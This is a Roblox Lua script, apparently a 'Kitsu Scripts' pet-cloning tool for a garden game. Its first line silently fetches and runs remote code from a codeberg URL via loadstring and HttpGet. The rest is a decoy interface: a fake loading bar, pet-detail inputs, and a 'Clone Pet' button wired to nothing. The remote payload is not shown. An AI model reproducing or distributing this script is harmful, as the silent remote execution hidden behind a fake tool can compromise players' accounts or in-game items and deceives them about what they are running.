-- Load Spawner silently
local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
Spawner.Load = function() end
pcall(function() Spawner.Load() end)

-- Services
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")

-- Cleanup
local GUI_NAME = "Kitsu"
if PlayerGui:FindFirstChild(GUI_NAME) then
	PlayerGui[GUI_NAME]:Destroy()
end

-- GUI Setup
local screenGui = Instance.new("ScreenGui", PlayerGui)
screenGui.Name = GUI_NAME
screenGui.ResetOnSpawn = false

-- Main Frame with garden-like theme
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 460, 0, 360)
mainFrame.Position = UDim2.new(0.5, -230, 0.5, -180)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(97, 51, 24) -- Dirt color
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true

-- Add pixel/brick texture
local bgTexture = Instance.new("ImageLabel", mainFrame)
bgTexture.Size = UDim2.new(1, 0, 1, 0)
bgTexture.Position = UDim2.new(0, 0, 0, 0)
bgTexture.BackgroundTransparency = 1
bgTexture.Image = "rbxassetid://12414020687" -- Example brick texture
bgTexture.ImageTransparency = 0.1

-- Grass top strip
local grassBar = Instance.new("Frame", mainFrame)
grassBar.Size = UDim2.new(1, 0, 0, 10)
grassBar.Position = UDim2.new(0, 0, 0, 0)
grassBar.BackgroundColor3 = Color3.fromRGB(93, 188, 63)

-- Logo Image (replaces GARDEN title)
local logoImage = Instance.new("ImageLabel", mainFrame)
logoImage.Size = UDim2.new(0, 263, 0, 70)
logoImage.Position = UDim2.new(0.5, 0, 0, 12)
logoImage.AnchorPoint = Vector2.new(0.5, 0)
logoImage.BackgroundTransparency = 1
logoImage.Image = "rbxassetid://17183268541" -- Replace with your uploaded GARDEN image asset ID

-- Loading Bar Background
local loadingBarBackground = Instance.new("Frame", mainFrame)
loadingBarBackground.Size = UDim2.new(0.8, 0, 0, 18)
loadingBarBackground.Position = UDim2.new(0.5, 0, 0.55, 0)
loadingBarBackground.AnchorPoint = Vector2.new(0.5, 0)
loadingBarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
Instance.new("UICorner", loadingBarBackground).CornerRadius = UDim.new(0, 8)

local loadingBar = Instance.new("Frame", loadingBarBackground)
loadingBar.Size = UDim2.new(0, 0, 1, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(90, 255, 160)
Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 8)

-- Loading Percent Text
local percentText = Instance.new("TextLabel", mainFrame)
percentText.Size = UDim2.new(1, 0, 0, 24)
percentText.Position = UDim2.new(0.5, 0, 0.55, -28)
percentText.AnchorPoint = Vector2.new(0.5, 0)
percentText.BackgroundTransparency = 1
percentText.Font = Enum.Font.GothamBold
percentText.TextSize = 18
percentText.TextColor3 = Color3.fromRGB(200, 255, 200)
percentText.Text = "Loading: 0%"

-- Footer Text
local footer = Instance.new("TextLabel", mainFrame)
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0.5, 0, 1, -24)
footer.AnchorPoint = Vector2.new(0.5, 1)
footer.BackgroundTransparency = 1
footer.Font = Enum.Font.Gotham
footer.TextSize = 14
footer.TextColor3 = Color3.fromRGB(100, 255, 100)
footer.Text = "Kitsu Scripts"

-- Animate Loading
local function animateLoading()
	for i = 1, 100 do
		percentText.Text = "Loading: " .. i .. "%"
		loadingBar.Size = UDim2.new(i / 100, 0, 1, 0)
		wait(0.02)
	end
end

animateLoading()

-- Inputs and Clone Button (revealed after loading)
local function setupInputs()
	local dropdown = Instance.new("TextBox", mainFrame)
	dropdown.PlaceholderText = "Enter Pet Name"
	dropdown.Size = UDim2.new(0.7, 0, 0, 30)
	dropdown.Position = UDim2.new(0.5, 0, 0.7, 0)
	dropdown.AnchorPoint = Vector2.new(0.5, 0)
	dropdown.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	dropdown.TextColor3 = Color3.fromRGB(0, 0, 0)
	dropdown.Text = ""
	Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

	local ageInput = Instance.new("TextBox", mainFrame)
	ageInput.PlaceholderText = "Pet Age"
	ageInput.Size = UDim2.new(0.3, -5, 0, 28)
	ageInput.Position = UDim2.new(0.1, 0, 0.82, 0)
	ageInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ageInput.TextColor3 = Color3.fromRGB(0, 0, 0)
	ageInput.Text = ""
	Instance.new("UICorner", ageInput).CornerRadius = UDim.new(0, 6)

	local weightInput = Instance.new("TextBox", mainFrame)
	weightInput.PlaceholderText = "Weight"
	weightInput.Size = UDim2.new(0.3, -5, 0, 28)
	weightInput.Position = UDim2.new(0.6, 0, 0.82, 0)
	weightInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	weightInput.TextColor3 = Color3.fromRGB(0, 0, 0)
	weightInput.Text = ""
	Instance.new("UICorner", weightInput).CornerRadius = UDim.new(0, 6)

	local cloneButton = Instance.new("TextButton", mainFrame)
	cloneButton.Size = UDim2.new(0.4, 0, 0, 32)
	cloneButton.Position = UDim2.new(0.5, 0, 0.91, 0)
	cloneButton.AnchorPoint = Vector2.new(0.5, 0)
	cloneButton.BackgroundColor3 = Color3.fromRGB(76, 175, 80)
	cloneButton.Text = "Clone Pet"
	cloneButton.TextColor3 = Color3.new(1,1,1)
	cloneButton.Font = Enum.Font.GothamBold
	cloneButton.TextSize = 16
	Instance.new("UICorner", cloneButton).CornerRadius = UDim.new(0, 6)
end

setupInputs()
